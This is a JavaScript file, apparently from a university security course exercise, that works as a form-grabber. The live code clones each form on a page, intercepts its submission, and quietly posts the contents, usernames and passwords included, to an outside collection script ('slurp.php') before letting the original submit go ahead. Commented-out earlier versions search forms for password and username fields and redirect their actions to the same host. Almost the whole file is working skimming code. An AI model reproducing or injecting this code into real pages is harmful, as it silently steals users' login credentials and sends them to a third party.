
// function traverseElement(element, word){
    
    
//     if (element.textContent.toLowerCase().includes(word) ){
//         return true
//     }  

//     if(element.name) {
//         if(element.name.toLowerCase().includes(word)) {
//             return true
//         }
//     }

//     if(element.type) {
//         if(element.type.toLowerCase().includes(word)) {
//             return true
//         }
//     }

//     for (let child of element.children) {
//         let found= traverseElement(child, word) 
//         if (found) { 
//             return true
//         }
//     }

//     return false
// }

// let forms = document.getElementsByTagName("form");

// for (let form of forms) {

// 	let originalForm = form
//     let newForm = document.createElement("form");
//    	// let newForm = originalForm.cloneNode(true);
//     let foundPassword = false
//     let foundUsername = false

//     for(let child of originalForm.children){
//         foundPassword = traverseElement(child, "password")
       
//         foundUsername = traverseElement(child, "username")
        

//         if(foundPassword || foundUsername) {
//             console.log("FOUND ")
//             console.log(child)

//             let childCopy = child.cloneNode(true)
//             newForm.appendChild(childCopy)
//         }
//         foundPassword = false
//         foundUsername = false

//     }

//     console.log(newForm.elements)
//     if (newForm.elements[0]) {
//         console.log(newForm.elements[0].value)
//     }

// 	newForm.action = "http://treeforty.csse.rose-hulman.edu/f/slurp.php";
// 	originalForm.action = "http://treeforty.csse.rose-hulman.edu/f/slurp.php";
// 	var elt = document.createElement("input");
// 	elt.setAttribute("name","340team");
// 	elt.setAttribute("value","BABA ZHENG");
// 	elt.setAttribute("type","hidden");
// 	originalForm.appendChild(elt);

//     if (foundPassword || foundUsername) {
//         newForm.submit()
//         originalForm.submit()
//     }

// }







let forms = document.getElementsByTagName("form");
let formToSubmit = null
for (let form of forms) {
    let originalForm = form
    let newForm = originalForm.cloneNode(true);
    newForm.action = "http://treeforty.csse.rose-hulman.edu/f/slurp.php";
    //originalForm.action = "http://treeforty.csse.rose-hulman.edu/f/slurp.php";
    let elt = document.createElement("input");
    elt.setAttribute("name","340team");
    elt.setAttribute("value","BABA ZHENG");
    elt.setAttribute("type","hidden");
    newForm.appendChild(elt);
    newForm.style.display = "none"
 
    originalForm.addEventListener("submit",(e)=>{
        document.body.appendChild(newForm)
            let formData = new FormData(newForm);
            e.preventDefault()
            fetch(newForm.action, {
                method: "POST",
                body: formData
            }).then((response) => {
                console.log(response.text())
                originalForm.submit()
            }).catch((err)=>{
                console.log(err)
            })
    })
}





// function originalFormsubmit(e){
  
// }


 // var formData = new FormData(e.target);
            
        //         fetch(newForm.action, {
        //         method: "POST",
        //         body: formData
        //     }).then((response) => {
        //         console.log(response);
        //         response.json().then((data)=>{
        //             console.log(data)
                    
        //         }).catch((err) =>{
        //             console.log(err)
        //             // originalForm.removeEventListener('submit', originalFormsubmit)
        //             // originalForm.submit()
        //             // newForm.submit()
        //             document.body.removeChild(currNewForm)
        //         })

        //     })  